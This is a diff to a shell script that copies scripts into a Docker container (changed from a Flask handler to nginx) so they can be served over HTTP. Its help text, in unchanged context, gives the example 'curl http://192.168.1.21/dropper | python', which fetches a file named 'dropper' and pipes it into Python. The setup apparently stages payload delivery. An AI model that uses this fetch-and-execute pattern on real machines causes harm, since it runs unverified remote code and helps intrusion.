@@ -8,7 +8,7 @@ This script is used to copy a script to the Flask App endpoint.
 This allows you to do things like: "curl http://192.168.1.21/dropper | python"
 
 Usage:
-  ./script_install.sh <command> [argument]
+  ./host_file.sh <command> [argument]
 
 Commands:
   install <script_path>   Copies the specified script to the container.
@@ -16,8 +16,8 @@ Commands:
   help                    Shows this help message.
 
 Examples:
-  ./script_install.sh install ./myscript.py
-  ./script_install.sh delete myscript.py
+  ./host_file.sh install ./myscript.py
+  ./host_file.sh delete myscript.py
 EOF
     # Exit with a non-zero status code to indicate an issue
     exit 1
@@ -50,7 +50,7 @@ case "$MODE" in
             exit 1
         fi
         echo "Installing '$FILE'..."
-        /usr/bin/sudo /usr/bin/docker cp "$FILE" yggdrasil-handler:/app/scripts
+        /usr/bin/sudo /usr/bin/docker cp "$FILE" nginx:/etc/nginx/scripts/
         ;;
 
     delete)
@@ -61,7 +61,7 @@ case "$MODE" in
         fi
         echo "Deleting '$FILE' from container..."
         # Use basename to ensure we only get the filename, not a path
-        /usr/bin/sudo /usr/bin/docker exec -it yggdrasil-handler rm "/app/scripts/$(basename "$FILE")"
+        /usr/bin/sudo /usr/bin/docker exec -it nginx rm "/etc/nginx/scripts/$(basename "$FILE")"
         ;;
 
     *)
